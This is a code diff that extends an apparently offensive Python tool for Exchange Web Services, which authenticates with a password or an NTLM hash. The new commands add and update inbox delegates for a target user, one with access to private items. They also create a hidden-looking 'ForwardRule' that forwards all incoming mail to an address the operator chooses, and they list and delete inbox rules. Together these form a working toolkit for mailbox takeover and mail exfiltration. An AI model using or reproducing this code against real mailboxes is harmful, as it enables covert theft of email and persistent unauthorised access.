@@ -90,7 +90,6 @@ def ewsManage(host, port, mode, domain, user, data,command):
 </soap:Envelope>
 '''
 
-
     elif command =='getmail':    
         POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
@@ -110,7 +109,6 @@ def ewsManage(host, port, mode, domain, user, data,command):
   </soap:Body>
 </soap:Envelope>
 '''
-
         Id = input("Input the ItemId of the Message:")
         Key = input("Input the ChangeKey of the Message:")
         POST_BODY = POST_BODY.format(id=Id, key=Key)
@@ -136,10 +134,8 @@ def ewsManage(host, port, mode, domain, user, data,command):
   </soap:Body>
 </soap:Envelope>
 '''
-
         Id = input("Input the ItemId of the Message who has Attachments:")
         POST_BODY = POST_BODY.format(id=Id)
-
 
     elif command =='saveattachment':          
         POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
@@ -158,6 +154,183 @@ def ewsManage(host, port, mode, domain, user, data,command):
 '''
         Id = input("Input the Id of the attachment:")
         POST_BODY = POST_BODY.format(id=Id)
+
+    elif command =='getdelegateofinbox': 
+        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2013_SP1" />
+  </soap:Header>
+  <soap:Body>
+    <m:GetDelegate IncludePermissions="true">
+      <m:Mailbox>
+        <t:EmailAddress>{mail}</t:EmailAddress>
+      </m:Mailbox>
+    </m:GetDelegate>
+  </soap:Body>
+</soap:Envelope>
+'''
+        EmailAddress = input("Input the EmailAddress of current user:")
+        POST_BODY = POST_BODY.format(mail=EmailAddress)
+
+    elif command =='adddelegateofinbox':          
+        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2013_SP1" />
+  </soap:Header>
+  <soap:Body>
+    <m:AddDelegate>
+      <m:Mailbox>
+        <t:EmailAddress>{mail1}</t:EmailAddress>
+      </m:Mailbox>
+      <m:DelegateUsers>
+      <t:DelegateUser>
+        <t:UserId>
+          <t:PrimarySmtpAddress>{mail2}</t:PrimarySmtpAddress>
+        </t:UserId>
+        <t:DelegatePermissions>
+          <t:InboxFolderPermissionLevel>Editor</t:InboxFolderPermissionLevel>
+        </t:DelegatePermissions>
+        <t:ReceiveCopiesOfMeetingMessages>false</t:ReceiveCopiesOfMeetingMessages>
+        <t:ViewPrivateItems>false</t:ViewPrivateItems>
+      </t:DelegateUser>
+    </m:DelegateUsers>
+      <m:DeliverMeetingRequests>DelegatesAndMe</m:DeliverMeetingRequests>
+    </m:AddDelegate>
+  </soap:Body>
+</soap:Envelope>
+'''
+        EmailAddress1 = input("Input the EmailAddress of current user:")
+        EmailAddress2 = input("Input the EmailAddress of target user:")
+        POST_BODY = POST_BODY.format(mail1=EmailAddress1, mail2=EmailAddress2)
+
+    elif command =='updatedelegateofinbox':          
+        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2013_SP1" />
+  </soap:Header>
+  <soap:Body>
+    <m:UpdateDelegate>
+      <m:Mailbox>
+        <t:EmailAddress>{mail1}</t:EmailAddress>
+      </m:Mailbox>
+      <m:DelegateUsers>
+      <t:DelegateUser>
+        <t:UserId>
+          <t:PrimarySmtpAddress>{mail2}</t:PrimarySmtpAddress>
+        </t:UserId>
+        <t:DelegatePermissions>
+          <t:InboxFolderPermissionLevel>Editor</t:InboxFolderPermissionLevel>
+        </t:DelegatePermissions>
+        <t:ReceiveCopiesOfMeetingMessages>false</t:ReceiveCopiesOfMeetingMessages>
+        <t:ViewPrivateItems>true</t:ViewPrivateItems>
+      </t:DelegateUser>
+    </m:DelegateUsers>
+      <m:DeliverMeetingRequests>DelegatesAndMe</m:DeliverMeetingRequests>
+    </m:UpdateDelegate>
+  </soap:Body>
+</soap:Envelope>
+'''
+        EmailAddress1 = input("Input the EmailAddress of current user:")
+        EmailAddress2 = input("Input the EmailAddress of target user:")
+        POST_BODY = POST_BODY.format(mail1=EmailAddress1, mail2=EmailAddress2)
+
+    elif command =='removedelegateofinbox':          
+        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2013_SP1" />
+  </soap:Header>
+  <soap:Body>
+    <m:RemoveDelegate>
+      <m:Mailbox>
+        <t:EmailAddress>{mail1}</t:EmailAddress>
+      </m:Mailbox>
+      <m:UserIds>
+        <t:UserId>
+          <t:PrimarySmtpAddress>{mail2}</t:PrimarySmtpAddress>
+        </t:UserId>
+    </m:UserIds>
+    </m:RemoveDelegate>
+  </soap:Body>
+</soap:Envelope>
+'''
+        EmailAddress1 = input("Input the EmailAddress of current user:")
+        EmailAddress2 = input("Input the EmailAddress of target user:")
+        POST_BODY = POST_BODY.format(mail1=EmailAddress1, mail2=EmailAddress2)
+
+    elif command =='getinboxrules':         
+        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2013_SP1" />
+  </soap:Header>
+  <soap:Body>
+    <m:GetInboxRules>
+      <m:MailboxSmtpAddress>{mail1}</m:MailboxSmtpAddress>
+    </m:GetInboxRules>
+  </soap:Body>
+</soap:Envelope>
+'''
+        EmailAddress1 = input("Input the EmailAddress of current user:")
+        POST_BODY = POST_BODY.format(mail1=EmailAddress1)
+
+    elif command =='updateinboxrules':         
+        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2013_SP1" />
+  </soap:Header>
+  <soap:Body>
+    <m:UpdateInboxRules>
+      <m:RemoveOutlookRuleBlob>true</m:RemoveOutlookRuleBlob>
+      <m:Operations>
+        <t:CreateRuleOperation>
+          <t:Rule>
+            <t:DisplayName>ForwardRule</t:DisplayName>
+            <t:Priority>1</t:Priority>
+            <t:IsEnabled>true</t:IsEnabled>
+            <t:Conditions />
+            <t:Exceptions />
+            <t:Actions>
+              <t:ForwardToRecipients>
+                <t:Address>
+                  <t:EmailAddress>{mail1}</t:EmailAddress>
+                </t:Address>
+              </t:ForwardToRecipients>
+            </t:Actions>
+          </t:Rule>
+        </t:CreateRuleOperation>
+      </m:Operations>
+    </m:UpdateInboxRules>
+  </soap:Body>
+</soap:Envelope>
+'''
+        EmailAddress1 = input("Input the EmailAddress you want to forward to:")
+        POST_BODY = POST_BODY.format(mail1=EmailAddress1)
+
+    elif command =='removeinboxrules':  
+        POST_BODY = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2013_SP1" />
+  </soap:Header>
+  <soap:Body>
+    <m:UpdateInboxRules>
+      <m:RemoveOutlookRuleBlob>true</m:RemoveOutlookRuleBlob>
+        <m:Operations>
+          <t:DeleteRuleOperation>
+            <t:RuleId>{id}</t:RuleId>
+          </t:DeleteRuleOperation>
+        </m:Operations>
+    </m:UpdateInboxRules>
+  </soap:Body>
+</soap:Envelope>
+'''
+        RuleId = input("Input the rule ID:")
+        POST_BODY = POST_BODY.format(id=RuleId)
 
     else:    
         print('[!]Wrong parameter')
@@ -282,7 +455,8 @@ def ewsManage(host, port, mode, domain, user, data,command):
                             file_object.write(truedata)                   
                           
                 else:
-                    print('[!] %s'%(responsecode[0]))    
+                    print('[!] %s'%(responsecode[0]))
+
 
         return True
 
@@ -307,7 +481,13 @@ if __name__ == '__main__':
         print('- getmail')         
         print('- getattachment')        
         print('- saveattachment')
-
+        print('- getdelegateofinbox')
+        print('- adddelegateofinbox')
+        print('- updatedelegateofinbox')
+        print('- removedelegateofinbox')
+        print('- getinboxrules')
+        print('- updateinboxrules')
+        print('- removeinboxrules')        
         print('Eg.')
         print('%s 192.168.1.1 443 plaintext test.com user1 password1 getfolderofinbox'%(sys.argv[0]))
         print('%s test.com 80 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1 listmailofinbox'%(sys.argv[0]))
